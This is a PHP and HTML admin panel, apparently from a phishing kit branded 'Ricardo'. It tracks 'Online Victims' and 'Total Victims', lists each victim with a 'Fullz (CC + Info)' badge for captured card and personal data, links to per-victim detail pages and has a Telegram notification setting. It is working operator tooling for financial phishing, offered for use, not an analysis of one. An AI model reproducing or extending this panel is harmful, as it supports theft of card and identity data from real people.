<a?php

session_start();

// Check if the user is logged in
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // If not logged in, redirect to index.php
    header('Location: index.php');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        /* Styles similar to your screenshot */
        body {
            margin: 0;
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #fff;
        }

        .dashboard-container {
            display: flex;
            height: 100vh;
        }

        .sidebar {
            width: 250px;
            background-color: #1a1a1a;
            padding: 20px;
        }

        .brand h2 {
            margin: 0;
            color: #fff;
        }

        nav ul {
            list-style: none;
            padding: 0;
        }

        .menu-item {
            margin: 20px 0;
            padding: 10px;
            color: #ccc;
            cursor: pointer;
        }

        .menu-item.active,
        .menu-item:hover {
            background-color: #333;
            color: #fff;
        }

        .main-content {
            flex: 1;
            padding: 20px;
        }

        header h1 {
            margin: 0 0 20px;
        }

        .stats-cards {
            display: flex;
            gap: 10px;
            /* Reduce the gap between cards */
            margin-bottom: 20px;
            justify-content: space-around;
        }

        .card {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 450px;
            /* Fixed width */
            max-width: 100%;
            /* Responsive */
            margin: 10px auto;
            /* Reduced margin to minimize gaps and center the card */
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            /* Optional: Add a shadow for better visual separation */

        }


        .card h3 {
            margin: 0 0 10px;
        }

        .card p {
            font-size: 24px;
            margin: 0;
        }

        .users-table {
            margin-top: 20px;
        }

        .users-table table {
            width: 100%;
            border-collapse: collapse;
        }

        .users-table th,
        .users-table td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }

        .users-table th {
            color: #ccc;
        }

        .users-table td {
            color: #fff;
        }

        .users-table tbody tr {
            background-color: #1e1e1e;
        }

        .users-table tbody tr:hover {
            background-color: #333;
        }

        .status-online {
            color: #00ff00;
            font-weight: bold;
        }

        .status-offline {
            color: #f20000;
            font-weight: bold;
        }

        .badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            color: #fff;
        }

        .badge.green {
            background-color: #00c853;
        }

        .badge.blue {
            background-color: #2962ff;
        }

        .badge.red {
            background-color: #d50000;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
        }

        .action-buttons .btn {
            padding: 6px 12px;
            border: none;
            cursor: pointer;
            border-radius: 4px;
            font-size: 14px;
        }

        .btn-view {
            background-color: #536dfe;
            color: #fff;
        }

        .btn-delete {
            background-color: #ff1744;
            color: #fff;
        }
    </style>
</head>

<body>
    <div class="dashboard-container">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="brand">
                <h2>Ricardo</h2>
            </div>
            <nav>
                <ul>
                    <li class="menu-item">
                        <a href="livepanel.php" style="text-decoration: none; color: inherit;">
                            <i class="icon"></i> Dashboard
                        </a>
                    </li>
                    <li class="menu-item">
                        <i class="icon"></i> Captcha Settings
                    </li>
                    <li class="menu-item">
                        <i class="icon"></i> Site Settings
                    </li>
                    <li class="menu-item">
                    <a href="./telegramUpdator.php" style="text-decoration: none; color: inherit;">
                        <i class="icon"></i>Telegram Notification </a>
                    </li>
                    <li class="menu-item">
                        <a href="runner/logout.php" style="text-decoration: none; color: inherit;">
                            <i class="icon"></i> Logout
                        </a>
                    </li>

                </ul>
            </nav>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <header>
                <h1>Welcome to Admin Panel - Ricardo</h1>
            </header>

            <section class="stats-cards">
                <!-- Stats Cards -->
                <div class="card">
                    <h3>Online Victims</h3>
                    <p id="onlineVictimsCount">

                    </p>
                    <p id="onlineVictims">Loading...</p>
                    <canvas id="onlineChart"></canvas>
                </div>
                <!-- Chart here -->
                <div class="card">
                    <h3>Total Victims</h3>
                    <p id="totalVictims">Loading...</p>
                    <canvas id="barChart"></canvas>
                </div>
                <!-- 
                <div class="card">
                    <h3>Online Victims</h3>
                    <p>0</p>
                    <canvas id="barChart"></canvas>
                </div>
                 More cards as needed -->
            </section>

            <section class="users-table">
                <h2>Victims</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Session ID</th>
                            <th>Status</th>
                            <th>IP</th>
                            <th>OS</th>
                            <th>Page</th>
                            <th>Created At</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody id="user-table-body">
                        <!-- Data will be injected here by JavaScript -->
                        <tr>
                            <td colspan="7">No victims found.</td>
                        </tr>
                    </tbody>
                </table>
            </section>
        </main>
    </div>

    <script>
        function fetchUsers() {
            $.ajax({
                url: 'runner/fetch_users.php',
                method: 'GET',
                dataType: 'json',
                success: function(data) {
                    const tableBody = $("#user-table-body");
                    tableBody.empty(); // Clear existing content

                    if (data.length === 0) {
                        tableBody.append('<tr><td colspan="7">No users found.</td></tr>');
                    } else {
                        data.forEach((user, index) => {
                            const statusBadge = user.status === 'online' ?
                                `<span class="badge green status-online">Online</span>` :
                                `<span class="badge red status-offline">Offline</span>`;

                            const pageBadge = `<span class="badge green">Fullz (CC + Info)</span>`; // Customize as per your data
                            const createdDate = user.registered_at; // Use the date from the backend (already formatted)

                            tableBody.append(`
                        <tr>
                            <td>#${user.id}</td>
                            <td>${statusBadge}</td>
                            <td>::1</td> <!-- Replace with actual IP data if available -->
                            <td>Windows</td> <!-- Replace with actual OS data if available -->
                            <td>${pageBadge}</td>
                            <td>${createdDate}</td>
                            <td>
                                <div class="action-buttons">
                                    <button class="btn btn-view" data-id="${user.id}">View</button>
                                    <button class="btn btn-delete" data-id="${user.id}">Delete</button>
                                </div>
                            </td>
                        </tr>
                    `);
                        });
                    }
                }
            });
        }

        // Call fetchUsers function periodically to refresh the status dynamically
        setInterval(fetchUsers, 5000); // Refresh every 5 seconds, for example


        document.addEventListener('DOMContentLoaded', function() {
            // Use event delegation to handle dynamically added buttons
            document.addEventListener('click', function(event) {
                if (event.target.classList.contains('btn-view')) {
                    // Get the user ID from the data-id attribute
                    const userId = event.target.getAttribute('data-id');

                    if (userId) {
                        // Redirect to the view_victims.php page with the user ID as a query parameter
                        window.location.href = `view_victims.php?id=${userId}`;
                    }
                }
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            // Use event delegation to handle dynamically added buttons
            document.addEventListener('click', function(event) {
                if (event.target.classList.contains('btn-delete')) {
                    // Display a popup with the message "Not Completed"
                    alert('Not Completed [TBD] !!!');

                    // You can add more logic here if needed, or stop further actions.
                    // For now, we'll just stop after showing the alert.
                    event.preventDefault(); // This prevents any default actions (if any are associated with the button)
                }
            });
        });


        // Fetch users on page load
        fetchUsers();

        // Re-fetch users every 5 seconds (5000ms) to check for updates
        setInterval(fetchUsers, 5000);
    </script>

    <script>
        function fetchVictimsCount() {
            $.ajax({
                url: 'runner/fetch_victims_count.php',
                method: 'GET',
                dataType: 'json',
                success: function(data) {
                    const victimCount = data.total_victims || 0;
                    $("p.victim-count").text(`${victimCount} Victim(s)`);
                },
                error: function() {
                    $("p.victim-count").text('0 Victim(s)');
                }
            });
        }

        // Call the function when the page loads
        fetchVictimsCount();
    </script>

    <!-- CHART BACKEND -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // Fetch the total number of victims from the PHP script
            fetch('runner/fetch_victims_count.php')
                .then(response => response.text()) // We're expecting plain text, not JSON
                .then(data => {
                    // Update the total victims count
                    document.getElementById('totalVictims').textContent = data + " Victim(s)";

                    // Assuming you want to display a simple bar chart with this data:
                    const ctx = document.getElementById('barChart').getContext('2d');
                    new Chart(ctx, {
                        type: 'bar',
                        data: {
                            labels: ['Total Victims'],
                            datasets: [{
                                label: 'Total Victims',
                                data: [parseInt(data)], // Convert the string data to a number
                                backgroundColor: 'rgba(75, 192, 192, 0.2)',
                                borderColor: 'rgba(75, 192, 192, 1)',
                                borderWidth: 1
                            }]
                        },
                        options: {
                            scales: {
                                y: {
                                    beginAtZero: true
                                }
                            }
                        }
                    });
                })
                .catch(error => {
                    console.error('Error fetching data:', error);
                    document.getElementById('totalVictims').textContent = "Error loading data";
                });
        });
    </script>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            let chart; // Variable to hold the chart instance

            function fetchAndUpdateData() {
                fetch('runner/fetch_online_count.php')
                    .then(response => response.text()) // We're expecting plain text, not JSON
                    .then(data => {
                        // Update the total online users count
                        document.getElementById('onlineVictims').textContent = data + " Online Victim(s)";

                        const onlineUserCount = parseInt(data);

                        if (chart) {
                            // Update the chart data if the chart already exists
                            chart.data.datasets[0].data = [onlineUserCount];
                            chart.update();
                        } else {
                            // If the chart doesn't exist, create it
                            const ctx = document.getElementById('onlineChart').getContext('2d');
                            chart = new Chart(ctx, {
                                type: 'bar',
                                data: {
                                    labels: ['Online Users'],
                                    datasets: [{
                                        label: 'Online Users',
                                        data: [onlineUserCount], // Convert the string data to a number
                                        backgroundColor: 'rgba(54, 162, 235, 0.2)',
                                        borderColor: 'rgba(54, 162, 235, 1)',
                                        borderWidth: 1
                                    }]
                                },
                                options: {
                                    scales: {
                                        y: {
                                            beginAtZero: true
                                        }
                                    }
                                }
                            });
                        }
                    })
                    .catch(error => {
                        console.error('Error fetching data:', error);
                        document.getElementById('onlineVictims').textContent = "Error loading data";
                    });
            }

            // Fetch the data initially when the page loads
            fetchAndUpdateData();

            // Refresh the data every 5 seconds
            setInterval(fetchAndUpdateData, 5000);
        });
    </script>



</body>

</html>